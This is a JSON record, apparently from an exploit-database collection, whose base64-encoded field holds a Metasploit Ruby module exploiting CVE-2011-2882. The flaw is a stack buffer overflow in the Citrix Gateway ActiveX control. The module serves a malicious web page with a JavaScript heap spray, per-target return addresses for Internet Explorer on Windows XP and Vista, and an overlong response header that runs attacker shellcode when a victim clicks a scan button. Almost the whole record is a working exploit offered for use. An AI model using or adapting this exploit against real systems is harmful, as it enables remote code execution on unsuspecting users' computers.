{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgJElkOiBjaXRyaXhfZ2F0ZXdheV9hY3R4LnJiIDEzNjcwIDIwMTEtMDgtMzEgMDA6MTU6NDZaIHNpbm4zciAkDQojIw0KDQojIw0KIyBUaGlzIGZpbGUgaXMgcGFydCBvZiB0aGUgTWV0YXNwbG9pdCBGcmFtZXdvcmsgYW5kIG1heSBiZSBzdWJqZWN0IHRvDQojIHJlZGlzdHJpYnV0aW9uIGFuZCBjb21tZXJjaWFsIHJlc3RyaWN0aW9ucy4gUGxlYXNlIHNlZSB0aGUgTWV0YXNwbG9pdA0KIyBGcmFtZXdvcmsgd2ViIHNpdGUgZm9yIG1vcmUgaW5mb3JtYXRpb24gb24gbGljZW5zaW5nIGFuZCB0ZXJtcyBvZiB1c2UuDQojIGh0dHA6Ly9tZXRhc3Bsb2l0LmNvbS9mcmFtZXdvcmsvDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdDMgPCBNc2Y6OkV4cGxvaXQ6OlJlbW90ZQ0KCVJhbmsgPSBOb3JtYWxSYW5raW5nDQoNCglpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UmVtb3RlOjpIdHRwU2VydmVyOjpIVE1MDQoNCglkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQoJCXN1cGVyKHVwZGF0ZV9pbmZvKGluZm8sDQoJCQknTmFtZScgICAgICAgICAgID0+ICdDaXRyaXggR2F0ZXdheSBBY3RpdmVYIENvbnRyb2wgU3RhY2sgQmFzZWQgQnVmZmVyIE92ZXJmbG93IFZ1bG5lcmFiaWxpdHknLA0KCQkJJ0Rlc2NyaXB0aW9uJyAgICA9PiAlcXsNCgkJCQkJVGhpcyBtb2R1bGUgZXhwbG9pdHMgYSBzdGFjayBiYXNlZCBidWZmZXIgb3ZlcmZsb3cgaW4gdGhlIENpdHJpeCBHYXRld2F5IA0KCQkJCUFjdGl2ZVggY29udHJvbC4gRXhwbG9pdGF0aW9uIG9mIHRoaXMgdnVsbmVyYWJpbGl0eSByZXF1aXJlcyB1c2VyIGludGVyYWN0aW9uLiANCgkJCQlUaGUgdmljdGltIG11c3QgY2xpY2sgYSBidXR0b24gaW4gYSBkaWFsb2cgdG8gYmVnaW4gYSBzY2FuLiBUaGlzIGlzIHR5cGljYWwgDQoJCQkJaW50ZXJhY3Rpb24gdGhhdCB1c2VycyBzaG91bGQgYmUgYWNjdXN0b20gdG8uDQoNCgkJCQkJRXhwbG9pdGF0aW9uIHJlc3VsdHMgaW4gY29kZSBleGVjdXRpb24gd2l0aCB0aGUgcHJpdmlsZWdlcyBvZiB0aGUgdXNlciB3aG8NCgkJCQlicm93c2VkIHRvIHRoZSBleHBsb2l0IHBhZ2UuDQoJCQkJCX0sDQoJCQknTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KCQkJJ0F1dGhvcicgICAgICAgICA9PiANCgkJCQlbDQoJCQkJCSdNaWNoYWwgVHJvam5hcmEnLCAjSW5pdGlhbCBkaXNjb3ZlcnkNCgkJCQkJJ2Jhbm5lZGl0JywNCgkJCQkJJ3Npbm4zcicsDQoJCQkJXSwNCgkJCSdWZXJzaW9uJyAgICAgICAgPT4gJyRSZXZpc2lvbjogMTM2NzAgJCcsDQoJCQknUmVmZXJlbmNlcycgICAgID0+DQoJCQkJWw0KCQkJCQlbICdDVkUnLCAgJzIwMTEtMjg4MiddLA0KCQkJCQlbICdPU1ZEQicsICc3NDE5MScgICBdLA0KCQkJCQlbICdVUkwnLCAnaHR0cHM6Ly9sYWJzLmlkZWZlbnNlLmNvbS92ZXJpc2lnbi9pbnRlbGxpZ2VuY2UvMjAwOS92dWxuZXJhYmlsaXRpZXMvZGlzcGxheS5waHA/aWQ9OTI5JyBdLA0KCQkJCV0sDQoJCQknRGVmYXVsdE9wdGlvbnMnID0+DQoJCQkJew0KCQkJCQknRVhJVEZVTkMnID0+ICdwcm9jZXNzJywNCgkJCQkJJ0luaXRpYWxBdXRvUnVuU2NyaXB0JyA9PiAnbWlncmF0ZSAtZicsDQoJCQkJfSwNCgkJCSdQYXlsb2FkJyAgICAgICAgPT4NCgkJCQl7DQoJCQkJCSdTcGFjZScgICAgPT4gNTAwLA0KCQkJCQknQmFkQ2hhcnMnID0+ICJceDAwXHgwYVx4MGRceDIwXHgzYlx4ODFceDgzXHg4OFx4OTAiLA0KCQkJCX0sDQoJCQknUGxhdGZvcm0nID0+ICd3aW4nLA0KCQkJJ1RhcmdldHMnICAgICAgICA9Pg0KCQkJCVsNCgkJCQkJWyAnQXV0b21hdGljJywge30gXSwNCgkJCQkJWyAnSUUgNiBvbiBXaW5kb3dzIFhQIFNQMycsIHsgJ1JldCcgPT4gMHgwYzBjMGMwYyB9IF0sDQoJCQkJCVsgJ0lFIDcgb24gV2luZG93cyBYUCBTUDMnLCB7ICdSZXQnID0+IDB4MGMwYzBiMGIgfSBdLA0KCQkJCQlbICdJRSA3IG9uIFdpbmRvd3MgVmlzdGEnLCAgeyAnUmV0JyA9PiAweDBjMGMwYjBiIH0gXSwNCgkJCQldLA0KCQkJJ1ByaXZpbGVnZWQnICAgICA9PiBmYWxzZSwNCgkJCSdEaXNjbG9zdXJlRGF0ZScgPT4gJ0p1bCAxNCAyMDExJywgI0Nvb3JkaW5hdGVkIHB1YmxpYyBkaXNjbG9zdXJlIGFjY29yZGluZyB0byBpRGVmZW5zZQ0KCQkJJ0RlZmF1bHRUYXJnZXQnICA9PiAwKSkNCgllbmQNCg0KCWRlZiBleHBsb2l0DQoJCUBvY3ggPSA6OkZpbGUucmVhZCg6OkZpbGUuam9pbihNc2Y6OkNvbmZpZy5pbnN0YWxsX3Jvb3QsICdkYXRhJywgJ2V4cGxvaXRzJywgJ0NWRS0yMDExLTI4ODInLCAnbnNlcGEub2N4JykpDQoJCXN1cGVyDQoJZW5kDQoNCglkZWYgZ2V0X3RhcmdldChyZXF1ZXN0KQ0KCQl0ID0gdGFyZ2V0DQoJCWFnZW50ID0gcmVxdWVzdC5oZWFkZXJzWydVc2VyLUFnZW50J10NCg0KCQl2cHJpbnRfc3RhdHVzKCJVc2VyLUFnZW50OiAje2FnZW50fSIpDQoNCgkJaWYgdC5uYW1lID1+IC9BdXRvbWF0aWMvDQoJCQlpZiBhZ2VudCA9fiAvTlQgNVwuMS8gYW5kIGFnZW50ID1+IC9NU0lFIDZcLjAvDQoJCQkJI1dpbiBYUCArIElFIDYNCgkJCQl0ID0gdGFyZ2V0c1sxXQ0KCQkJZWxzaWYgYWdlbnQgPX4gL05UIDVcLjEvIGFuZCBhZ2VudCA9fiAvTVNJRSA3XC4wLw0KCQkJCSNXaW4gWFAgKyBJRSA3DQoJCQkJdCA9IHRhcmdldHNbMl0NCgkJCWVsc2lmIGFnZW50ID1+IC9OVCA2XC4wLyBhbmQgYWdlbnQgPX4gL01TSUUgN1wuMC8NCgkJCQkjV2luIFZpc3RhICsgSUU3DQoJCQkJdCA9IHRhcmdldHNbMl0NCgkJCWVsc2lmIGFnZW50ID09ICduc2VwYScNCgkJCQkjQ2l0cml4IEFjY2VzcyBHYXRld2F5IHJlcXVlc3RpbmcgL2VwYXENCgkJCQl0ID0gYWdlbnQNCgkJCWVsc2UNCgkJCQkjVGFyZ2V0IG5vdCBzdXBwb3J0ZWQNCgkJCQl0ID0gbmlsDQoJCQllbmQNCgkJZW5kDQoNCgkJcmV0dXJuIHQsIGFnZW50DQoJZW5kDQoNCglkZWYgb25fcmVxdWVzdF91cmkoY2xpLCByZXF1ZXN0KQ0KCQlAbXl0YXJnZXQsIGFnZW50ID0gZ2V0X3RhcmdldChyZXF1ZXN0KSBpZiBAbXl0YXJnZXQubmlsPw0KCQl2cHJpbnRfc3RhdHVzKCJDbGllbnQgcmVxdWVzdGVkOiAje3JlcXVlc3QudXJpfS4iKQ0KDQoJCSNUYXJnZXQgbm90IHN1cHBvcnRlZCwgd2lsbCBub3QgZ28gb24NCgkJaWYgQG15dGFyZ2V0Lm5pbD8NCgkJCXByaW50X2Vycm9yKCJUYXJnZXQgbm90IHN1cHBvcnRlZDogI3thZ2VudH0iKQ0KCQkJc2VuZF9ub3RfZm91bmQoY2xpKQ0KCQkJcmV0dXJuDQoJCWVuZA0KDQoJCWlmIHJlcXVlc3QudXJpLm1hdGNoKC9uc2VwYS8pDQoJCQlwcmludF9zdGF0dXMoIlNlbmRpbmcgbnNlcGEub2N4IHRvICN7Y2xpLnBlZXJob3N0fSIpDQoJCQlzZW5kX3Jlc3BvbnNlKGNsaSwgQG9jeCwgeyAnQ29udGVudC1UeXBlJyA9PiAnYXBwbGljYXRpb24vYmluYXJ5JyB9KQ0KCQkJcmV0dXJuDQoJCWVuZA0KDQoJCWlmIHJlcXVlc3QudXJpLm1hdGNoKC9lcGFxLykNCgkJCXBhZGRpbmcgPSByYW5kX3RleHRfYWxwaGEoMzAwKQ0KDQoJCQljc2VjID0gImVlcGFfMF8iDQoJCQljc2VjIDw8IHBhZGRpbmdbMCwgMjU5XQ0KCQkJY3NlYyA8PCBbQG15dGFyZ2V0LnJldF0ucGFjaygnVionKQ0KCQkJY3NlYyA8PCBwYWRkaW5nWzAsIDY4XQ0KDQoJCQlyZXN1bHQgPSByYW5kX3RleHRfYWxwaGEoMTAwMCkNCgkJCXNlbmRfcmVzcG9uc2UoY2xpLCByYW5kX3RleHRfYWxwaGEoMzApLCB7ICdDU0VDJyA9PiBjc2VjLCAnUkVTVUxUJyA9PiByZXN1bHQgfSApDQoJCQlAbXl0YXJnZXQgPSBuaWwNCgkJCXJldHVybg0KCQllbmQNCg0KCQkjIFJlLWdlbmVyYXRlIHRoZSBwYXlsb2FkDQoJCXJldHVybiBpZiAoKHAgPSByZWdlbmVyYXRlX3BheWxvYWQoY2xpKSkgPT0gbmlsKQ0KDQoJCSMgcGF5bG9hZCBpbiBKUyBmb3JtYXQNCgkJY29kZSA9IFJleDo6VGV4dC50b191bmVzY2FwZShwYXlsb2FkLmVuY29kZWQpDQoNCgkJI0ZvciBkZWJ1Z2dpbmcgcHVycG9zZXM6IG5vcHMuc3Vic3RyaW5nKDAsMHg1MzQpIGxhbmRzIHRoZSBwYXlsb2FkIGV4YWN0bHkgYXQgMHgwYzBjMGMwYyBmb3IgSUU2DQoJCXNwcmF5ID0gPDwtSlMNCgkJdmFyIGhlYXBfbGliID0gbmV3IGhlYXBMaWIuaWUoMHgyMDAwMCk7DQoJCXZhciBjb2RlID0gdW5lc2NhcGUoIiN7Y29kZX0iKTsNCgkJdmFyIG5vcHMgPSB1bmVzY2FwZSgiJXUwYzBjJXUwYzBjIik7DQoNCgkJd2hpbGUgKG5vcHMubGVuZ3RoIDwgMHgxMDAwKSBub3BzICs9IG5vcHM7DQoJCXZhciBvZmZzZXQgPSBub3BzLnN1YnN0cmluZygwLCAweDU1MCk7DQoJCXZhciBzaGVsbGNvZGUgPSBvZmZzZXQgKyBjb2RlICsgbm9wcy5zdWJzdHJpbmcoMCwgMHg4MDAtY29kZS5sZW5ndGgtb2Zmc2V0Lmxlbmd0aCk7DQoNCgkJd2hpbGUgKHNoZWxsY29kZS5sZW5ndGggPCAweDIwMDAwKSBzaGVsbGNvZGUgKz0gc2hlbGxjb2RlOw0KCQl2YXIgYmxvY2sgPSBzaGVsbGNvZGUuc3Vic3RyaW5nKDAsICgweDEwMDAwLTYpLzIpOw0KDQoJCWhlYXBfbGliLmdjKCk7DQoNCgkJZm9yICh2YXIgaSA9IDA7IGkgPCAweDYwMDA7IGkrKykgew0KCQkJaGVhcF9saWIuYWxsb2MoYmxvY2spOw0KCQl9DQoJCUpTDQoNCgkJc3ByYXkgPSBoZWFwbGliKHNwcmF5KQ0KCQlzcHJheSA9IDo6UmV4OjpFeHBsb2l0YXRpb246OkpTT2JmdS5uZXcoc3ByYXkpDQoJCXNwcmF5Lm9iZnVzY2F0ZQ0KDQoJCWxvYWQgPSAlUXwNCgkJdmFyIGQ9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm5zZXBhZGl2Iik7DQoJCWlmKGQpIHsNCgkJCWQuaW5uZXJIVE1MPQ0KCQkJJzxvYmplY3QgaWQ9Im5zZXBhIiBjbGFzc2lkPSJDTFNJRDoxODFCQ0FCMi1DODlCLTRFNEItOUU2Qi01OUZBNjdBNDI2QjUiICcrDQoJCQknd2lkdGg9MXB4IGhlaWdodD0xcHggY29kZWJhc2U9IiN7Z2V0X3Jlc291cmNlfS9lcGEvbnNlcGEub2N4I3ZlcnNpb249OCwwLDU5LDEiPicgKw0KCQkJJzxwYXJhbSBuYW1lPSJjb29raWUiIHZhbHVlPSIwMTIzNDU2Nzg5YWJjZGVmMDEyMzQ1Njc4OWFiY2RlZiI+JysNCgkJCSc8cGFyYW0gbmFtZT0ibG9jYXRpb24iIHZhbHVlPSInK2RvY3VtZW50LmxvY2F0aW9uKyciPicrDQoJCQknPHBhcmFtIG5hbWU9InRyYWNlIiB2YWx1ZT0iREVCVUciPicrDQoJCQknPHBhcmFtIG5hbWU9InZpcCIgdmFsdWU9IjI1NS4yNTUuMjU1LjI1NSI+JysNCgkJCSc8L29iamVjdD4nOw0KCQl9IGVsc2Ugew0KCQkgIGFsZXJ0KCdJbnRlcm5hbCBFcnJvcicpOw0KCQl9DQp8DQoJCSMgdGhlIHJldCBzbGlkZSBnZXRzIGV4ZWN1dGVkIHZpYSBjYWxsIFtlc2krNDViXQ0KCQlodG1sID0gPDwtRU9TDQoJCTxodG1sPg0KCQk8Ym9keT4NCgkJPGRpdiBpZD0ibnNlcGFkaXYiPjwvZGl2Pg0KCQk8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0Ij4NCgkJI3tzcHJheX0NCgkJI3tsb2FkfQ0KCQk8L3NjcmlwdD4NCgkJPC9ib2R5Pg0KCQk8L2h0bWw+DQoJCUVPUw0KDQoJCWh0bWwgPSBodG1sLmdzdWIoL15cdFx0LywgJycpDQoNCgkJIyB3ZSBuZWVkIHRvIGhhbmRsZSBkaXJlY3QgL2VwYXEgcmVxdWVzdHMNCgkJcHJvYyA9IFByb2MubmV3IGRvIHxjbGksIHJlcXwNCgkJCW9uX3JlcXVlc3RfdXJpKGNsaSwgcmVxKQ0KCQllbmQNCg0KCQlhZGRfcmVzb3VyY2UoeydQYXRoJyA9PiAiL2VwYXEiLCAnUHJvYycgPT4gcHJvY30pIHJlc2N1ZSBuaWwNCgkJcHJpbnRfc3RhdHVzKCJTZW5kaW5nICN7c2VsZi5uYW1lfSBIVE1MIHRvICN7Y2xpLnBlZXJob3N0fToje2NsaS5wZWVycG9ydH0iKQ0KCQlzZW5kX3Jlc3BvbnNlKGNsaSwgaHRtbCwgeyAnQ29udGVudC1UeXBlJyA9PiAndGV4dC9odG1sJyB9KQ0KCWVuZA0KZW5k", 
    "filename": "platforms/windows/remote/17762.rb", 
    "id": "17762", 
    "cves": [
        "CVE-2011-2882"
    ]
}